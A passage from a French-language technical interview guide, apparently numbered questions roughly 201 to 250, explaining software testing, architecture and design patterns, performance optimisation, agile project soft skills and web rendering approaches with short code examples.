Selenium   : pilote le navigateur DE L'EXTÉRIEUR via un driver, supporte quasiment tous les navigateurs,
             plus mature/répandu en entreprise, mais plus verbeux et plus lent à écrire/déboguer
```
```js
// Cypress attend automatiquement que l'élément soit visible/cliquable — pas de sleep() manuel
cy.get('#bouton').click();

// Selenium nécessite souvent des attentes explicites
await driver.wait(until.elementLocated(By.id('bouton')));
```
Cypress est généralement recommandé pour démarrer sur un projet web moderne (meilleure DX), Selenium reste pertinent pour des besoins multi-navigateurs très larges ou legacy.

---

**202. Test de charge et de stress**

```js
// k6 — script de test de charge
import http from 'k6/http';
export const options = {
  vus: 100,        // 100 utilisateurs virtuels simultanés
  duration: '30s'
};
export default function() {
  http.get('https://monapi.com/produits');
}
```
```bash
k6 run test-charge.js
```
- **Test de charge** : simule un trafic **attendu/normal** (ex: 100 utilisateurs simultanés) pour vérifier que l'app tient la charge prévue.
- **Test de stress** : pousse **au-delà** de la capacité prévue pour trouver le point de rupture et observer comment le système échoue (gracieusement ou en cascade).

Outils : **k6** (moderne, scriptable en JS), **JMeter** (plus ancien, interface graphique, très complet). Objectif : détecter les goulots d'étranglement (DB, mémoire) avant que les vrais utilisateurs ne les rencontrent en production.

**203. Performance front-end (Lighthouse, Web Vitals)**

```bash
npx lighthouse https://monsite.com --view
```
Métriques **Core Web Vitals** clés :
```
LCP (Largest Contentful Paint) : temps d'affichage du plus gros élément visible — vise < 2.5s
FID/INP (interactivité)        : délai de réponse à la première interaction — vise < 200ms
CLS (Cumulative Layout Shift)  : stabilité visuelle (pas de contenu qui "saute") — vise < 0.1
```
Lighthouse audite automatiquement performance, accessibilité, SEO, bonnes pratiques, et donne des recommandations concrètes (compresser une image, différer un script). Ces métriques influencent aussi le référencement Google.

**204. Snapshot testing**

Capture le rendu (souvent HTML/JSX) d'un composant à un instant T, et compare les futurs rendus à cette référence sauvegardée.

```jsx
import renderer from 'react-test-renderer';

test('rendu du bouton correspond au snapshot', () => {
  const arbre = renderer.create(<Bouton texte="OK" />).toJSON();
  expect(arbre).toMatchSnapshot(); // première exécution : sauvegarde ; suivantes : compare
});
```
Utile pour détecter des changements **non intentionnels** dans le rendu d'un composant UI stable. **Piège fréquent** : accepter aveuglément les diffs de snapshot (`--updateSnapshot`) sans les relire — ça transforme le test en simple formalité qui ne détecte plus rien.

---

**205. Test de régression**

Vérifie qu'une fonctionnalité qui marchait auparavant **continue de marcher** après un changement de code — attrape les effets de bord non intentionnels d'une modification.

```js
// Un bug a été corrigé une fois — on ajoute un test qui reproduit CE bug précis
test('régression: la remise ne doit pas dépasser 100%', () => {
  // ce bug était survenu en prod le 12/03 avec un montant négatif
  expect(calculerRemise(-50, 200)).toBe(0);
});
```
Bonne pratique : à chaque bug corrigé en production, ajouter un test qui reproduit exactement ce cas — garantit qu'il ne réapparaîtra pas silencieusement lors d'un futur refactoring.

## Stratégies de Test (206-211)

**206. Test pyramid**

```
        /\
       /E2E\        peu nombreux, lents, coûteux — parcours critiques uniquement
      /------\
     /Intégra-\      quantité moyenne — interactions entre modules
    /--tion----\
   /------------\
  /   Unitaires  \   nombreux, rapides, peu coûteux — cœur de la couverture
 /----------------\
```
Pourquoi cette forme : les tests unitaires sont rapides et faciles à maintenir (base large), les E2E sont précieux mais lents/fragiles (sommet étroit). **Anti-pattern fréquent** ("ice cream cone") : trop de tests E2E et pas assez d'unitaires → suite de tests lente, instable, et difficile à déboguer quand elle échoue.

---

**207. Test double (stub, mock, fake, spy)**

```js
// Stub — retourne une valeur fixe prédéfinie, sans logique
const stubAPI = { getUser: () => ({ nom: "Test" }) };

// Mock — comme un stub, mais on VÉRIFIE aussi qu'il a été appelé correctement
const mockEnvoyerEmail = jest.fn();
envoyerNotification(mockEnvoyerEmail);
expect(mockEnvoyerEmail).toHaveBeenCalledWith('test@test.com');

// Fake — implémentation simplifiée mais fonctionnelle (ex: DB en mémoire au lieu d'une vraie DB)
class FakeUserRepository {
  users = [];
  save(user) { this.users.push(user); }
}

// Spy — observe une fonction RÉELLE sans changer son comportement, juste pour vérifier les appels
const spy = jest.spyOn(console, 'log');
maFonction();
expect(spy).toHaveBeenCalled();
```
Terme générique "test double" (comme une doublure au cinéma) qui regroupe ces variantes selon ce qu'on veut vérifier : juste remplacer (stub/fake) ou aussi observer les interactions (mock/spy).

---

**208. Tester du code asynchrone**

```js
// Avec async/await — le plus lisible
test('recupererDonnees renvoie les bonnes données', async () => {
  const donnees = await recupererDonnees();
  expect(donnees).toEqual({ id: 1 });
});

// Tester qu'une promesse est rejetée
test('recupererDonnees rejette si l\'ID est invalide', async () => {
  await expect(recupererDonnees(-1)).rejects.toThrow('ID invalide');
});
```
**Erreur classique** : oublier `await` sur une assertion asynchrone — le test se termine et "passe" avant même que le code asynchrone ait fini de s'exécuter, masquant silencieusement un vrai échec.

---

**209. Tester des composants React (React Testing Library)**

```jsx
import { render, screen, fireEvent } from '@testing-library/react';

test('le compteur s\'incrémente au clic', () => {
  render(<Compteur />);
  const bouton = screen.getByRole('button', { name: /incrémenter/i });
  fireEvent.click(bouton);
  expect(screen.getByText('1')).toBeInTheDocument();
});
```
Philosophie clé de RTL : tester **ce que l'utilisateur voit et fait** (cliquer, lire un texte affiché), pas les détails d'implémentation interne (state interne, noms de méthodes) — un composant refactorisé mais avec le même comportement visible ne doit pas casser les tests.

---

**210. Tester une API REST (Supertest)**

```js
const request = require('supertest');
const app = require('../app');

test('POST /users crée un utilisateur avec un email valide', async () => {
  const res = await request(app)
    .post('/users')
    .send({ email: 'test@test.com', nom: 'Test' });

  expect(res.status).toBe(201);
  expect(res.body).toHaveProperty('id');
});

test('POST /users rejette un email invalide', async () => {
  const res = await request(app).post('/users').send({ email: 'pas-un-email' });
  expect(res.status).toBe(400); // traiter le cas d'erreur, pas seulement le succès
});
```
Supertest permet de tester l'API **sans démarrer un vrai serveur réseau** (il pilote directement l'app Express en mémoire) — plus rapide que des vrais appels HTTP, bon compromis pour des tests d'intégration d'API.

**211. Contract testing (Pact)**

Dans une architecture microservices, vérifie que le **contrat** entre un consommateur (ex: front-end) et un fournisseur (ex: API back-end) reste respecté, sans avoir besoin de déployer les deux ensemble pour tester.

```js
// Le consommateur définit ce qu'il attend de l'API
pact.addInteraction({
  state: 'un utilisateur existe',
  uponReceiving: 'une requête GET /users/1',
  withRequest: { method: 'GET', path: '/users/1' },
  willRespondWith: { status: 200, body: { id: 1, nom: like('Essama') } }
});
```
Le fichier de contrat généré est ensuite rejoué contre le **vrai** service fournisseur en CI, pour vérifier qu'il respecte toujours ce contrat — détecte les breaking changes d'API avant qu'ils cassent le consommateur en production, sans dépendre de tests E2E complets et fragiles entre tous les services.

## Architecture & Design Patterns (212-220)

**212. Clean Architecture / Hexagonal Architecture**

```
        [UI / Controllers]
               ↓
        [Cas d'usage / Services]   ← logique métier, indépendante du framework
               ↓
        [Entités / Domaine]         ← cœur métier, ne dépend de RIEN d'externe
               ↑
        [Repositories / Adaptateurs] → base de données, API externes
```
Principe central : les dépendances pointent **vers l'intérieur** — le cœur métier (règles business) ne connaît ni la base de données, ni le framework web utilisé. On peut ainsi changer de DB (PostgreSQL → MongoDB) ou de framework (Express → Fastify) sans toucher à la logique métier.

```js
// Le cas d'usage dépend d'une INTERFACE, pas d'une implémentation concrète
class CreerCommande {
  constructor(repository) { this.repository = repository; } // injection de dépendance
  executer(donnees) { /* logique métier pure */ return this.repository.save(donnees); }
}
```
Avantage majeur : testabilité (on peut injecter un fake repository dans les tests, sans vraie DB).

---

**213. Repository et Service Layer**

```js
// Repository — abstrait l'accès aux données
class UserRepository {
  async findById(id) { return db.query('SELECT * FROM users WHERE id = $1', [id]); }
}

// Service Layer — orchestre la logique métier, utilise un ou plusieurs repositories
class UserService {
  constructor(userRepo, emailService) {
    this.userRepo = userRepo;
    this.emailService = emailService;
  }
  async inscrire(donnees) {
    const user = await this.userRepo.create(donnees);
    await this.emailService.envoyerBienvenue(user.email); // orchestration de plusieurs préoccupations
    return user;
  }
}
```
Le Repository isole l'accès aux données, le Service Layer isole la **logique métier** et orchestre plusieurs repositories/services — le controller (route Express) devient très fin, juste un point d'entrée qui délègue au service.

---

**214. CQRS**

```js
// Command — écriture, modifie l'état, ne retourne généralement rien de significatif
class CreerCommandeCommand {
  async executer(donnees) { await db.commandes.insert(donnees); }
}

// Query — lecture seule, peut être optimisée séparément (ex: vue dénormalisée, cache dédié)
class ObtenirCommandesQuery {
  async executer(userId) { return db.commandesVueOptimisee.find({ userId }); }
}
```
Sépare les modèles de lecture et d'écriture — utile quand les besoins divergent fortement (ex: beaucoup plus de lectures que d'écritures, ou format de lecture très différent du format de stockage optimisé pour l'écriture). Complexité ajoutée significative — pertinent surtout sur des systèmes à forte charge ou logique métier complexe, pas par défaut sur un CRUD simple.

---

**215. Event Sourcing**

Au lieu de stocker uniquement l'**état actuel** d'une donnée, on stocke la séquence complète des **événements** qui ont mené à cet état — l'état actuel se reconstruit en rejouant les événements.

```js
// Au lieu de : { compteId: 1, solde: 150 }
// On stocke la séquence d'événements :
[
  { type: 'CompteCree', compteId: 1, soldeInitial: 0 },
  { type: 'Depot', compteId: 1, montant: 200 },
  { type: 'Retrait', compteId: 1, montant: 50 }
]
// Le solde actuel (150) se recalcule en rejouant : 0 + 200 - 50
```
Avantages : historique complet et immuable (audit facile), possibilité de "voyager dans le temps" (reconstruire l'état à n'importe quel moment passé). Coût : complexité significative, nécessite souvent des "snapshots" périodiques pour éviter de rejouer des milliers d'événements à chaque lecture.

---

**216. Domain-Driven Design (DDD)**

```
Entity       : objet avec une identité unique qui persiste dans le temps (ex: un Utilisateur, identifié par son ID,
               même si son nom change)
Value Object : objet défini uniquement par ses valeurs, sans identité propre (ex: une Adresse — deux adresses
               avec les mêmes champs sont interchangeables)
Aggregate    : groupe d'entités/value objects traités comme une unité cohérente, avec une "racine" qui
               contrôle l'accès (ex: une Commande est l'aggregate root, ses LignesCommande ne sont modifiables
               qu'à travers elle)
```
```js
class Commande { // Aggregate Root
  ajouterLigne(produit, quantite) {
    if (quantite <= 0) throw new Error("Quantité invalide"); // règle métier centralisée ici
    this.lignes.push(new LigneCommande(produit, quantite));
  }
}
```
DDD structure le code autour du **langage métier réel** (parlé avec les experts du domaine), pour que le code reflète fidèlement les règles business plutôt qu'une structure purement technique.

**217. Event-Driven Architecture (RabbitMQ, Kafka)**

```js
// Producteur — publie un événement sans savoir qui va le consommer
await channel.publish('commandes', 'commande.creee', Buffer.from(JSON.stringify(commande)));

// Consommateur(s) — réagissent indépendamment à l'événement, chacun pour son propre besoin
// Service Email : envoie une confirmation
// Service Stock : décrémente l'inventaire
// Service Analytics : enregistre la métrique
```
Les services communiquent via des événements plutôt que des appels directs synchrones — découple fortement les services (le producteur n'a pas besoin de connaître les consommateurs), permet d'ajouter de nouveaux consommateurs sans modifier le producteur.

**RabbitMQ** : broker de messages traditionnel, bon pour des files de tâches et du routing complexe. **Kafka** : conçu pour du très haut débit et la rétention/rejeu d'événements sur de longues périodes (utile pour l'event sourcing et l'analytique en temps réel).

**218. Message queue vs Publish/Subscribe**

```
Message Queue (point-à-point) : un message est consommé par UN SEUL consommateur, puis retiré de la queue
Producteur → [Queue] → Consommateur A (le message disparaît une fois traité)

Publish/Subscribe : un message est diffusé à TOUS les abonnés intéressés
Producteur → [Topic] → Consommateur A
                     → Consommateur B
                     → Consommateur C
```
Queue : idéal pour distribuer du **travail** entre plusieurs workers (chaque tâche traitée une seule fois, par un seul worker — répartition de charge). Pub/Sub : idéal pour de la **notification** où plusieurs systèmes indépendants doivent réagir au même événement (chacun sa propre logique).

**219. Pattern Singleton**

```js
class ConnexionDB {
  static instance;

  constructor() {
    if (ConnexionDB.instance) return ConnexionDB.instance; // retourne l'instance existante
    this.connexion = /* établir la connexion */;
    ConnexionDB.instance = this;
  }
}

const db1 = new ConnexionDB();
const db2 = new ConnexionDB();
console.log(db1 === db2); // true — une seule instance partagée
```
Garantit qu'une classe n'a **qu'une seule instance** dans toute l'application, avec un point d'accès global. Cas d'usage : connexion DB partagée, configuration globale, cache en mémoire. **Piège** : peut rendre les tests difficiles (état global partagé entre tests) et masquer des dépendances cachées — à utiliser avec parcimonie, souvent remplacé par l'injection de dépendances.

**220. Pattern Factory**


## Patterns de Conception — suite (222-224)

**222. Pattern Decorator**

Ajoute dynamiquement des responsabilités à un objet, sans modifier sa classe d'origine ni créer une explosion de sous-classes.

```ts
interface Cafe {
  cout(): number;
  description(): string;
}

class CafeSimple implements Cafe {
  cout() { return 2; }
  description() { return "Café"; }
}

// Chaque decorator "enveloppe" l'objet précédent et ajoute son comportement
class AvecLait implements Cafe {
  constructor(private cafe: Cafe) {}
  cout() { return this.cafe.cout() + 0.5; }
  description() { return this.cafe.description() + " + lait"; }
}

class AvecSucre implements Cafe {
  constructor(private cafe: Cafe) {}
  cout() { return this.cafe.cout() + 0.2; }
  description() { return this.cafe.description() + " + sucre"; }
}

let commande = new AvecSucre(new AvecLait(new CafeSimple()));
console.log(commande.description()); // "Café + lait + sucre"
console.log(commande.cout());        // 2.7
```
Alternative aux décorateurs `@` de TypeScript vus en question 69 (syntaxe spécifique au langage) — ici c'est le pattern générique de composition d'objets, applicable dans n'importe quel langage orienté objet. Évite de créer `CafeAvecLaitEtSucre`, `CafeAvecSucreSeul`, etc. pour chaque combinaison possible.

**223. Pattern Strategy**

Permet de choisir dynamiquement un algorithme/comportement à l'exécution, en l'échangeant sans modifier le code qui l'utilise.

```js
// Différentes stratégies de calcul de livraison
const livraisonStandard = (poids) => poids * 2;
const livraisonExpress = (poids) => poids * 5 + 10;
const livraisonGratuite = () => 0;

class Commande {
  constructor(strategieLivraison) {
    this.strategieLivraison = strategieLivraison; // injectée, interchangeable
  }
  calculerFraisLivraison(poids) {
    return this.strategieLivraison(poids);
  }
}

const commande = new Commande(livraisonExpress);
console.log(commande.calculerFraisLivraison(5)); // 35

// Changer de stratégie sans toucher à la classe Commande
commande.strategieLivraison = livraisonGratuite;
```
Intérêt : évite les longs `if/else` ou `switch` répétés partout dans le code pour choisir un comportement — chaque stratégie est isolée, testable indépendamment, et on peut en ajouter une nouvelle sans modifier le code existant (respecte le principe ouvert/fermé).

**224. Pattern Middleware (Express)**

Chaîne de fonctions qui traitent une requête **successivement**, chacune pouvant modifier la requête/réponse, ou interrompre la chaîne.

```js
function middleware1(req, res, next) {
  console.log("Étape 1");
  req.donnee = "ajoutée par middleware1";
  next(); // passe au suivant
}

function middleware2(req, res, next) {
  console.log("Étape 2, reçu:", req.donnee);
  next();
}

app.get('/route', middleware1, middleware2, (req, res) => {
  res.send("Traitement final");
});
```
Chaque middleware a une responsabilité unique (logging, auth, validation, parsing) et peut être combiné/réordonné librement. Le pattern repose sur le principe de **chaîne de responsabilité** : chaque maillon décide de continuer (`next()`), répondre directement (`res.send()`), ou transmettre une erreur (`next(err)`) — très généralisable au-delà d'Express (utilisé aussi dans Redux, Koa, etc.).

## Performance & Optimisation (225-230)

**225. Stratégies de mise en cache**

```
Cache-aside (le plus courant) :
  1. L'appli vérifie le cache
  2. Si absent (miss), lit la DB, PUIS remplit le cache
  3. Prochaine lecture : cache hit

Read-through :
  L'appli lit TOUJOURS via le cache ; c'est le cache lui-même qui va chercher en DB si absent (logique déléguée)

Write-through :
  Chaque écriture met à jour le cache ET la DB en même temois, de façon synchrone
  → cache toujours cohérent, mais écriture plus lente

Write-behind (write-back) :
  L'écriture va d'abord dans le cache, la DB est mise à jour de façon asynchrone/différée
  → écriture rapide, mais risque de perte de données si le cache tombe avant la synchronisation
```
```js
// Cache-aside typique
async function getProduits() {
  let cache = await redis.get('produits');
  if (cache) return JSON.parse(cache);
  const produits = await db.query('SELECT * FROM produits');
  await redis.set('produits', JSON.stringify(produits), { EX: 300 });
  return produits;
}
```
Choix selon le besoin : cache-aside est le plus simple et le plus répandu ; write-through convient quand la cohérence immédiate est critique ; write-behind convient quand la vitesse d'écriture prime sur la garantie de durabilité immédiate.

**226. Redis pour le caching** *(déjà détaillé en 115 et 225 — complément pratique)*

```js
const redis = require('redis');
const client = redis.createClient();
await client.connect();

// Invalidation du cache après une écriture — évite de servir une donnée périmée
app.put('/produits/:id', async (req, res) => {
  await db.produits.update(req.params.id, req.body);
  await client.del('produits'); // invalide le cache global
  res.sendStatus(200);
});
```
**Piège classique déjà mentionné** : oublier d'invalider le cache après une mise à jour — l'utilisateur continue de voir l'ancienne donnée pendant toute la durée du TTL, ce qui semble être un bug alors que c'est un problème de stratégie de cache.

**227. Lazy loading vs eager loading (bases de données)**

```js
// Lazy loading — la relation n'est chargée QUE si on y accède explicitement
const user = await User.findById(1);
console.log(user.commandes); // déclenche une requête supplémentaire ICI, à ce moment précis

// Eager loading — tout est chargé en une fois, dès le départ
const user = await User.findById(1, { include: 'commandes' }); // 1 seule requête (ou JOIN)
```
Lazy loading semble pratique mais mène facilement au problème **N+1** (vu en question 158) si utilisé dans une boucle. Eager loading charge tout d'avance, plus efficace si on sait qu'on aura besoin de la relation, mais gaspille des ressources si la relation n'est finalement pas utilisée. Règle pratique : eager loading par défaut sur les relations systématiquement utilisées, lazy loading pour les relations occasionnelles.

**228. Sharding et partitionnement**

```
Partitionnement (horizontal, dans UNE seule base) :
  Table "commandes_2024" | Table "commandes_2025" | Table "commandes_2026"
  → divise une grosse table en morceaux plus petits, gérés par le même serveur DB

Sharding (distribué sur PLUSIEURS serveurs) :
  Serveur A : users 1-1M | Serveur B : users 1M-2M | Serveur C : users 2M-3M
  → chaque shard est une base de données indépendante, sur une machine différente
```
Le partitionnement simple accélère les requêtes sur une seule instance (moins de données à scanner par partition), tandis que le sharding permet de dépasser la capacité physique d'une seule machine en répartissant la charge sur plusieurs serveurs. Le choix de la **clé de partitionnement/sharding** (date, région, ID utilisateur) est critique — une mauvaise clé peut créer des "hot shards" surchargés pendant que d'autres restent sous-utilisés.

**229. Compression (Gzip, Brotli)**

```js
const compression = require('compression');
app.use(compression()); // compresse automatiquement les réponses HTTP
```
```nginx
# Nginx
gzip on;
gzip_types text/plain application/json text/css application/javascript;
```
Réduit la taille des réponses HTTP (souvent 60-80% de réduction sur du texte/JSON/CSS/JS) avant l'envoi réseau, le navigateur décompresse automatiquement. **Brotli** offre généralement un meilleur taux de compression que Gzip mais est légèrement plus lent à compresser — bon compromis : Brotli pour les assets statiques pré-compressés au build, Gzip pour le contenu généré dynamiquement en temps réel.

**230. Bundle splitting et tree shaking**

```js
// Tree shaking — élimine le code JAMAIS utilisé du bundle final
import { debounce } from 'lodash-es'; // seul "debounce" est inclus, pas tout lodash
// vs
import _ from 'lodash'; // toute la librairie est incluse, même si on n'utilise qu'une fonction

// Bundle splitting — divise le code en plusieurs fichiers chargés à la demande
const Dashboard = lazy(() => import('./Dashboard')); // fichier séparé, chargé seulement si visité
```
Le tree shaking fonctionne uniquement avec des **imports ES modules statiques** (analysables avant exécution) — `require()` dynamique ou du code avec effets de bord au niveau module peuvent empêcher cette optimisation. Le bundle splitting réduit le poids du chargement **initial**, quitte à charger davantage plus tard, au fur et à mesure de la navigation.

## Soft Skills & Gestion de Projet (231-247)

**231. Expliquer un concept technique à un non-technicien**

Approche généralement efficace : utiliser des analogies issues du quotidien (une base de données = un classeur organisé, une API = un serveur de restaurant qui prend la commande et l'apporte), éviter le jargon ou le définir immédiatement s'il est inévitable, se concentrer sur le "pourquoi" et l'impact concret plutôt que le "comment" technique, et vérifier la compréhension en posant des questions plutôt qu'en enchaînant les explications.

**232. Rédiger une spécification technique**

Structure typique et efficace :
```
1. Contexte / Problème à résoudre (pourquoi cette fonctionnalité existe)
2. Objectifs et critères de succès mesurables
3. Solution proposée (architecture, flux de données)
4. Hors périmètre (ce que ça NE couvre PAS explicitement)
5. Cas limites et gestion d'erreur envisagés
6. Impact sur l'existant (breaking changes, migration nécessaire)
```
Une bonne spec traite les cas d'erreur et limites **avant** d'être validée, pas après implémentation — cela évite des allers-retours coûteux une fois le développement commencé.

**233. Code reviews constructives**

Bonnes pratiques côté relecteur : commenter le **code**, jamais la personne ("cette fonction pourrait être simplifiée" plutôt que "tu as compliqué ça"), distinguer les remarques bloquantes des suggestions optionnelles (préfixe type "nit:" pour les détails mineurs), poser des questions plutôt qu'affirmer quand la raison d'un choix n'est pas claire, et reconnaître explicitement les bonnes idées, pas seulement les problèmes.

Côté auteur : ne pas prendre les retours personnellement, expliquer le contexte/contrainte si un choix semble étrange sans l'être, et répondre à chaque commentaire (même juste "corrigé" ou "je garde ainsi car...").

**234. Agile et Scrum**

```
Rôles :
  Product Owner    : définit et priorise le backlog (le "quoi")
  Scrum Master      : facilite le processus, retire les obstacles (le "comment collaborer")
  Équipe de dev      : réalise le travail (le "comment techniquement")

Cérémonies :
  Sprint Planning    : planifier le travail du sprint à venir
  Daily Standup      : point quotidien court (ce qui a été fait, ce qui reste, les blocages)
  Sprint Review       : démonstration du travail terminé aux parties prenantes
  Sprint Retrospective : réflexion d'équipe sur ce qui a bien/mal fonctionné, pour s'améliorer
```
Scrum organise le travail en **sprints** (itérations de durée fixe, souvent 1-2 semaines), avec un backlog priorisé et une amélioration continue via la rétrospective.

---

**235. Kanban vs Scrum**

```
Scrum  : itérations à durée FIXE (sprints), engagement sur un lot de travail défini à l'avance
Kanban : flux CONTINU, pas de sprints — les tâches avancent colonne par colonne (À faire → En cours → Terminé)
         avec une limite de travail en cours (WIP limit) par colonne
```
Kanban est plus adapté à un flux de travail imprévisible ou réactif (support, maintenance, incidents), où planifier 2 semaines à l'avance n'a pas de sens. Scrum convient mieux à un développement de fonctionnalités planifiable avec des objectifs de sprint clairs.

**236. User story**

Format standard, centré sur la valeur pour l'utilisateur plutôt que sur l'implémentation technique :

```
En tant que [rôle],
Je veux [action/fonctionnalité],
Afin de [bénéfice/objectif].

Exemple :
En tant qu'utilisateur inscrit,
Je veux recevoir un email de confirmation après ma commande,
Afin d'avoir une preuve de mon achat.

Critères d'acceptation :
- L'email est envoyé dans les 5 minutes suivant la commande
- L'email contient le numéro de commande et le montant total
```
Les critères d'acceptation précisent quand la story est considérée comme "terminée" — évitent les ambiguïtés sur ce qui est réellement attendu.

**237. Estimer une user story (story points, planning poker)**

```
Story points : unité RELATIVE de complexité/effort (pas une durée en heures)
               souvent sur une échelle de Fibonacci : 1, 2, 3, 5, 8, 13, 21...

Planning poker : chaque membre de l'équipe estime en secret (cartes physiques/digitales),
                  puis tous révèlent en même temps — les écarts importants déclenchent une discussion
                  pour aligner la compréhension avant de re-estimer
```
L'échelle de Fibonacci (non-linéaire) reflète l'incertitude croissante avec la taille — la différence entre 1 et 2 points est précise, mais entre 13 et 21 l'incertitude est trop grande pour un chiffre exact, d'où les "sauts". Le vote simultané évite l'effet d'ancrage (le premier qui parle influence les autres).

**238. Prioriser un backlog (méthode MoSCoW)**

```
Must have   : indispensable, sans ça le projet échoue (ex: paiement fonctionnel pour un e-commerce)
Should have : important mais pas bloquant pour le lancement (ex: filtres de recherche avancés)
Could have  : agréable à avoir si le temps le permet (ex: mode sombre)
Won't have  : explicitement exclu de cette itération (évite l'ambiguïté/scope creep)
```
Force à des décisions claires plutôt que de traiter tout comme "important" — souvent utilisé pour définir le périmètre minimal d'une release ou d'un MVP (Minimum Viable Product).

**239. Dette technique**

Le coût différé de choix rapides/imparfaits pris pour aller plus vite à court terme (raccourcis, code non testé, architecture temporaire) — comme une dette financière, elle "porte intérêt" : plus elle reste non traitée, plus elle ralentit le développement futur.

```
Exemples :
- Code dupliqué au lieu d'être factorisé, par manque de temps
- Absence de tests sur une fonctionnalité livrée en urgence
- Librairie obsolète jamais mise à jour, de plus en plus risquée/incompatible avec le temps
```
Gestion pratique : la rendre **visible** (backlog dédié, tickets explicites), allouer un temps régulier pour la réduire (ex: 10-20% de chaque sprint), et distinguer la dette "consciente et acceptée temporairement" de la dette "accidentelle" (mauvaise conception non identifiée) qui nécessite une vraie discussion d'équipe.

---

**240. Gérer les interruptions et la productivité**

Approches courantes : regrouper les communications asynchrones (email, messages) à des créneaux dédiés plutôt qu'en continu, bloquer des plages de "deep work" sans notifications pour les tâches complexes, distinguer urgence réelle et fausse urgence avant d'interrompre son focus, et documenter où on s'était arrêté avant de basculer sur autre chose (facilite la reprise après une interruption).

---

**241. Gérer un projet qui prend du retard**

Étapes typiques : identifier précisément la cause du retard (sous-estimation initiale, scope qui a grossi, blocage technique imprévu) avant d'agir, communiquer la situation tôt et honnêtement aux parties prenantes plutôt que d'espérer rattraper silencieusement, ré-évaluer le périmètre (couper le "Could have" du MoSCoW plutôt que sacrifier la qualité), et éviter le réflexe d'ajouter plus de personnes en urgence sur un projet déjà en retard (la loi de Brooks : ça ralentit souvent davantage à court terme, le temps d'onboarding dépassant le gain immédiat).

**242. Post-mortem d'un incident**

```
Structure typique :
1. Chronologie factuelle (quand détecté, quand résolu, qui a fait quoi)
2. Impact (utilisateurs affectés, durée, coût)
3. Cause racine (pas juste le symptôme immédiat)
4. Ce qui a bien fonctionné dans la réponse
5. Actions correctives concrètes, avec responsables et échéances
```
Principe clé : **blameless postmortem** (sans chercher de coupable individuel) — l'objectif est de comprendre les failles du système/process qui ont permis l'incident, pas de punir une personne. Un post-mortem qui cherche un coupable pousse les gens à cacher les erreurs futures plutôt qu'à les signaler tôt.

**243. Rester à jour techniquement**

Pratiques courantes : suivre un nombre limité de sources de qualité plutôt que de tout essayer de suivre (newsletters ciblées, blogs d'ingénierie de grandes entreprises, changelogs des outils utilisés au quotidien), pratiquer activement plutôt que consommer passivement (petit projet personnel, contribution open source), et accepter qu'il est impossible de tout suivre — prioriser ce qui est pertinent pour son domaine actuel.

**244. Choisir la bonne technologie pour un projet**

Critères pertinents au-delà du "c'est la techno à la mode" : maturité et stabilité de l'écosystème, disponibilité de développeurs compétents sur le marché (facilité de recrutement futur), adéquation avec les compétences déjà présentes dans l'équipe, coût d'infrastructure et de maintenance à long terme, et taille/support de la communauté (documentation, résolution de bugs, librairies disponibles).

**Piège fréquent** : choisir une technologie récente et excitante pour un projet critique en production, sans considérer la maturité de son écosystème ni la disponibilité de développeurs pour la maintenir dans 2-3 ans.

**245. Open source et contribution**

```
Façons de contribuer, du plus accessible au plus impliqué :
- Signaler un bug clair et reproductible (issue bien documentée)
- Améliorer la documentation (souvent sous-estimé, très apprécié des mainteneurs)
- Corriger un "good first issue" (souvent taggé explicitement pour les nouveaux contributeurs)
- Proposer une nouvelle fonctionnalité (après discussion préalable avec les mainteneurs, pas de PR surprise sur un gros changement)
```
Bonne pratique avant de contribuer : lire le `CONTRIBUTING.md` du projet, vérifier qu'une issue/PR similaire n'existe pas déjà, et discuter de l'approche avant d'investir du temps sur une grosse contribution qui pourrait être refusée.

**246. Préparer un entretien technique (whiteboarding, system design)**

Approche recommandée pour le "whiteboarding" (algo/coding) : clarifier le problème et les contraintes à voix haute avant de coder, réfléchir à voix haute pour montrer le raisonnement (pas seulement la solution finale), commencer par une solution simple qui fonctionne avant d'optimiser, et tester mentalement avec des cas limites (tableau vide, valeur négative).

Pour le "system design" : clarifier les exigences fonctionnelles et non-fonctionnelles (combien d'utilisateurs, quelle latence acceptable) avant de proposer une architecture, partir d'une solution simple puis l'améliorer progressivement (scalabilité, cache, redondance), et expliquer les compromis (trade-offs) de chaque choix plutôt que présenter une seule solution comme évidente.

**247. Veille technologique**

```
Organisation typique :
- Sources fixes suivies régulièrement (newsletters, flux RSS ciblés, changelogs d'outils utilisés)
- Temps dédié récurrent (ex: 30 min/semaine), plutôt que "quand j'ai le temps" (qui n'arrive jamais)
- Système de capture rapide (liste de liens à lire plus tard) pour ne pas interrompre le travail en cours
- Partage en équipe (ex: canal Slack dédié) pour mutualiser la veille plutôt que chacun refasse le même travail
```
Objectif réaliste : pas de suivre TOUT ce qui sort, mais rester conscient des tendances majeures de son domaine et creuser en profondeur seulement ce qui est directement pertinent pour ses projets actuels ou à venir.

## Web & Mobile (248-252)

**248. SSR vs CSR**

```
CSR (Client-Side Rendering) : le serveur envoie un HTML quasi vide + un gros bundle JS,
                                le navigateur exécute le JS pour construire la page
SSR (Server-Side Rendering) : le serveur génère le HTML COMPLET pour chaque requête,
                                le navigateur affiche immédiatement, puis JS "hydrate" pour l'interactivité
```
```jsx
// Next.js SSR
export async function getServerSideProps() {
  const donnees = await fetch('https://api.com/produits').then(r => r.json());
  return { props: { donnees } }; // HTML déjà rempli avant d'arriver au navigateur
}
```
Avantages SSR : premier affichage plus rapide (pas d'attente du JS), meilleur SEO (les robots voient le contenu directement dans le HTML). Avantage CSR : moins de charge serveur par requête, navigation ultra-fluide une fois l'app chargée (SPA). **Piège CSR** : un site majoritairement CSR peut apparaître "vide" aux robots d'indexation qui n'exécutent pas bien le JS.

---

**249. Static Site Generation (SSG)**

```jsx
// Next.js SSG — généré UNE FOIS au build, pas à chaque requête
export async function getStaticProps() {
  const articles = await fetch('https://api.com/articles').then(r => r.json());
  return { props: { articles }, revalidate: 3600 }; // ISR : régénère après 1h si demandé
}
```
Le HTML est pré-généré au moment du build et servi comme un fichier statique (via CDN) — **extrêmement rapide** car aucun calcul serveur à chaque requête. Idéal pour du contenu qui change rarement (blog, documentation, page marketing). Pour du contenu qui change souvent tout en gardant les bénéfices du SSG, l'**ISR** (Incremental Static Regeneration, `revalidate`) régénère certaines pages périodiquement en arrière-plan sans tout rebuilder. **Astro** pousse cette philosophie plus loin ("zero JS by default") pour des sites à faible interactivité.

**250. Progressive Web Apps (PWA)**

```json
// manifest.json
{
  "name": "Mon App",
  "short_name": "App",
  "icons": [{ "src": "icon.png", "sizes": "512x512" }],
  "display": "standalone",
  "start_url": "/"
}
```
```js
// service-worker.js — permet le fonctionnement hors ligne
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then(reponse => reponse || fetch(event.request))
  );

